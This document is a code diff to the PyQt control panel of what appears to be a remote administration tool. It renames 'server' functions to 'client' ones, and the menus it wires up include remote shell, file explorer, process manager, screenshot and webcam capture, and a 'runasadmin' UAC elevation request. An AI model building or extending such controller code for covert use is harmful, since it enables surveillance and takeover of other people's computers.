@@ -73,7 +73,8 @@ class MainDialog(QMainWindow, gui.Ui_MainWindow):
         # update gui
         self.gui = QApplication.processEvents
 
-        self.portLabel.setText(str(self.PORT))
+        self.portLabel.setText('[%s]' % str(self.PORT))
+        self.ipv4Label.setText('[%s]' % str(self.IPADDRESS))
 
         # unlocked servers bank
         self.unlockedSockets = []
@@ -100,10 +101,10 @@ class MainDialog(QMainWindow, gui.Ui_MainWindow):
         self.actionRemote_Scripting.setDisabled(True)
         self.actionDesktop_Preview.setDisabled(True)
         self.actionWebcam_Preview.setDisabled(True)
-        self.actionLock_Server.setDisabled(True)
+        self.actionLock_Client.setDisabled(True)
         #self.lockServerButton.setVisible(False)
-        self.actionStop_Server.setDisabled(True)
-        self.actionUnlock_Server.setDisabled(True)
+        self.actionStop_Client.setDisabled(True)
+        self.actionUnlock_Client.setDisabled(True)
 
         # indexes for servers table
         self.index_of_ipAddress = 0
@@ -126,7 +127,7 @@ class MainDialog(QMainWindow, gui.Ui_MainWindow):
         self.serversTable.setColumnWidth(self.index_of_microphone, 45)
         self.serversTable.setColumnWidth(self.index_of_webcamera, 45)
         # servers table double click trigger
-        self.serversTable.doubleClicked.connect(self.unlock_server)
+        self.serversTable.doubleClicked.connect(self.unlock_client)
         # Initializing right click menu
         self.serversTable.setContextMenuPolicy(Qt.CustomContextMenu)
         self.connect(self.serversTable, SIGNAL('customContextMenuRequested(const QPoint&)'),
@@ -141,9 +142,9 @@ class MainDialog(QMainWindow, gui.Ui_MainWindow):
         #self.updatePreviewButton.triggered.connect(self.get_desktop_preview)
         #self.getWebcamButton.triggered.connect(self.get_webcam_preview)
         #self.screenSaveButton.triggered.connect(self.save_preview)
-        self.actionUnlock_Server.triggered.connect(self.unlock_server)
-        self.actionLock_Server.triggered.connect(self.lock_server)
-        self.actionStop_Server.triggered.connect(self.lock_server)
+        self.actionUnlock_Client.triggered.connect(self.unlock_client)
+        self.actionLock_Client.triggered.connect(self.lock_client)
+        self.actionStop_Client.triggered.connect(self.terminate_client)
         self.actionSet_Alias.triggered.connect(self.add_alias)
         self.actionRun_As_Admin.triggered.connect(self.run_as_admin)
         ###
@@ -173,7 +174,8 @@ class MainDialog(QMainWindow, gui.Ui_MainWindow):
     def listen_start(self):
         # update settings
         self.update_settings()
-        self.portLabel.setText(str(self.PORT))
+        self.portLabel.setText('[%s]' % str(self.PORT))
+        self.ipv4Label.setText('[%s]' % str(self.IPADDRESS))
 
         # Initializing variables
         if not self.acceptthreadState:
@@ -318,7 +320,7 @@ class MainDialog(QMainWindow, gui.Ui_MainWindow):
             time.sleep(1)
 
     def get_desktop_preview(self):
-        server = self.current_server()
+        server = self.current_client()
         if server:
             screen_dict = get(self.socks[server]['sock'], 'getScreen', 'screenshot')
             try:
@@ -334,7 +336,7 @@ class MainDialog(QMainWindow, gui.Ui_MainWindow):
                 pass
 
     def get_webcam_preview(self):
-        server = self.current_server()
+        server = self.current_client()
         if server:
             webcam_dict = get(self.socks[server]['sock'], 'getWebcam', 'webcamera')
             try:
@@ -444,10 +446,10 @@ class MainDialog(QMainWindow, gui.Ui_MainWindow):
         # update servers online counter
         self.onlineStatus.setText(str(len(self.socks)))
 
-    def unlock_server(self):
+    def unlock_client(self):
         while 1:
             if self.serversTable.item(self.serversTable.currentRow(), self.index_of_lock).text() == 'LOCKED':
-                server = self.current_server()
+                server = self.current_client()
                 if server:
                     text, ok = QInputDialog.getText(self, 'Unlock Server', 'Enter Password: ', QLineEdit.Password)
                     if ok:
@@ -462,20 +464,20 @@ class MainDialog(QMainWindow, gui.Ui_MainWindow):
             else:
                 break
 
-    def lock_server(self):
-        server = self.current_server()
-        if server:
-            send(self.socks[server]['sock'], 'lock')
+    def lock_client(self):
+        client = self.current_client()
+        if client:
+            send(self.socks[client]['sock'], 'lock')
 
     def update_main_menu(self):
         try:
             if self.serversTable.item(self.serversTable.currentRow(), self.index_of_lock).text() == 'LOCKED':
                 #self.actionUnlock_Server.setVisible(True)
-                self.actionUnlock_Server.setDisabled(False)
+                self.actionUnlock_Client.setDisabled(False)
                 self.actionSet_Alias.setDisabled(False)
                 self.actionRun_As_Admin.setDisabled(False)
                 self.actionDesktop_Preview.setDisabled(False)
-                server = self.current_server()
+                server = self.current_client()
                 if self.socks[server]['webcamdevice'] != 'NoDevice':
                     self.actionWebcam_Preview.setDisabled(False)
 
@@ -486,8 +488,8 @@ class MainDialog(QMainWindow, gui.Ui_MainWindow):
                 self.actionRemote_Scripting.setDisabled(True)
                 self.actionRemote_Process_Manager.setDisabled(True)
                 #self.actionLock_Server.setVisible(False)
-                self.actionLock_Server.setDisabled(True)
-                self.actionStop_Server.setDisabled(True)
+                self.actionLock_Client.setDisabled(True)
+                self.actionStop_Client.setDisabled(True)
             else:
                 self.actionRemote_Shell.setDisabled(False)
                 self.actionRemote_Explorer.setDisabled(False)
@@ -497,12 +499,12 @@ class MainDialog(QMainWindow, gui.Ui_MainWindow):
                 self.actionRemote_Scripting.setDisabled(False)
                 self.actionRemote_Process_Manager.setDisabled(False)
                 #self.actionLock_Server.setVisible(True)
-                self.actionLock_Server.setDisabled(False)
-                self.actionStop_Server.setDisabled(False)
+                self.actionLock_Client.setDisabled(False)
+                self.actionStop_Client.setDisabled(False)
                 #self.unlockServerButton.setVisible(False)
-                self.actionUnlock_Server.setDisabled(True)
+                self.actionUnlock_Client.setDisabled(True)
                 self.actionDesktop_Preview.setDisabled(False)
-                server = self.current_server()
+                server = self.current_client()
                 if self.socks[server]['webcamdevice'] != 'NoDevice':
                     self.actionWebcam_Preview.setDisabled(False)
         except:
@@ -513,12 +515,12 @@ class MainDialog(QMainWindow, gui.Ui_MainWindow):
             self.actionRemote_Scripting.setDisabled(True)
             self.actionRemote_Process_Manager.setDisabled(True)
             #self.actionLock_Server.setVisible(False)
-            self.actionLock_Server.setDisabled(True)
-            self.actionStop_Server.setDisabled(True)
+            self.actionLock_Client.setDisabled(True)
+            self.actionStop_Client.setDisabled(True)
             self.actionSet_Alias.setDisabled(True)
             self.actionRun_As_Admin.setDisabled(True)
             #self.unlockServerButton.setVisible(True)
-            self.actionUnlock_Server.setDisabled(True)
+            self.actionUnlock_Client.setDisabled(True)
             self.actionDesktop_Preview.setDisabled(True)
             self.actionWebcam_Preview.setDisabled(True)
             #self.screenSaveButton.setDisabled(True)
@@ -547,7 +549,7 @@ class MainDialog(QMainWindow, gui.Ui_MainWindow):
             server_menu.addSeparator()
 
             if self.serversTable.item(server_index, self.index_of_lock).text() == 'LOCKED':
-                server_menu.addAction(QIcon(os.path.join(assets, 'unlock.png')), 'Unlock Server', self.unlock_server)
+                server_menu.addAction(QIcon(os.path.join(assets, 'unlock.png')), 'Unlock Server', self.unlock_client)
 
             else:
                 server_menu.addAction(QIcon(os.path.join(assets, 'mshell.png')), 'Shell',
@@ -568,14 +570,14 @@ class MainDialog(QMainWindow, gui.Ui_MainWindow):
                 server_menu.addSeparator()
                 server_menu.addMenu(server_options_menu)
                 server_options_menu.addAction(QIcon(os.path.join(assets, 'lock.png')), 'Lock Server',
-                                              self.lock_server)
+                                              self.lock_client)
                 server_options_menu.addAction(QIcon(os.path.join(assets, 'stop.png')), 'Terminate Server',
-                                              self.terminate_server)
+                                              self.terminate_client)
 
             server_menu.exec_(self.serversTable.mapToGlobal(point))
 
     # get item
-    def current_server(self):
+    def current_client(self):
         try:
             return int(self.serversTable.item(self.serversTable.currentRow(), self.index_of_socket).text())
         except AttributeError:
@@ -604,7 +606,7 @@ class MainDialog(QMainWindow, gui.Ui_MainWindow):
             'processes': mprocesses,
         }
 
-        server = self.current_server()
+        server = self.current_client()
         if server:
             args = {
                 'sock': self.current_sock,
@@ -618,19 +620,19 @@ class MainDialog(QMainWindow, gui.Ui_MainWindow):
                 self.pluginsBank[plugin_id].show()
 
     def add_alias(self):
-        server = self.current_server()
+        server = self.current_client()
         if server:
             text, ok = QInputDialog.getText(self, 'Set Alias', 'Enter Name: ')
             if ok:
                 self.alias.set_alias(self.socks[server]['ip_address'], self.socks[server]['os'], text)
 
     def run_as_admin(self):
-        server = self.current_server()
+        server = self.current_client()
         if server:
             get(self.socks[server]['sock'], 'runasadmin', 'uac')
 
-    def terminate_server(self):
-        server = self.current_server()
+    def terminate_client(self):
+        server = self.current_client()
         if server:
             warn = QMessageBox(QMessageBox.Question, 'Confirm', 'Are you sure to terminate server?')
             warn.setStandardButtons(QMessageBox.Yes | QMessageBox.No)
@@ -639,7 +641,7 @@ class MainDialog(QMainWindow, gui.Ui_MainWindow):
                 send(self.socks[server]['sock'], 'terminateServer', 'terminateserver')
 
     def run_plugin(self, mode):
-        server = self.current_server()
+        server = self.current_client()
         if server:
             get(self.socks[server]['sock'], 'startChildSocket %s' % server, mode)
 
